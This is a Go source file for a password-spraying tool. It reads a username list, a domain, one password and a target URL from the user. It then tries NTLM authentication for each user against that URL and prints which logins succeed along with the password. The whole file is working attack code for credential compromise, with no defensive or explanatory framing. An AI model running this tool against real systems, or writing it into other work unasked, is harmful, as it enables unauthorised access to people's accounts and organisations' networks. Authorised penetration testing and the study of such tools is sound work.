package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"log"
	"net/http"
	"os"
	"strings"

	httpntlm "github.com/vadimi/go-http-ntlm/v2"
)

func passwordspray() {
	
	filePath := ""
	domain := ""
	password := ""
	targetURL := ""
	fmt.Print("Enter Userlist: ")
	fmt.Scan(&filePath)
	fmt.Print("Enter domain :")
	fmt.Scan(&domain)
	fmt.Print("Enter Password :")
	fmt.Scan(&password)
	fmt.Print("Enter target url :")
	fmt.Scan(&targetURL)
	file, err := os.Open(filePath)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		username := scanner.Text()
		processUser(username, domain, password, targetURL)
	}

	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}
}

func processUser(username, domain, password, targetURL string) {
	fmt.Printf("User Processing: %s\n", username)

	client := http.Client{
		Transport: &httpntlm.NtlmTransport{
			Domain:   domain,
			User:     username,
			Password: password,
			RoundTripper: &http.Transport{
				TLSClientConfig: &tls.Config{},
			},
		},
	}

	req, err := http.NewRequest("GET", targetURL, strings.NewReader(""))
	if err != nil {
		log.Printf("For user %s request failed: %v\n", username, err)
		return
	}

	resp, err := client.Do(req)
	if err != nil {
		log.Printf("For user  %s request failed: %v\n", username, err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 200 && resp.StatusCode < 300 {
		fmt.Printf("Login succesfull for %s : %s", username, password)
	} else {
		fmt.Printf("Login failed for %s : %s", username, password)
	}
}
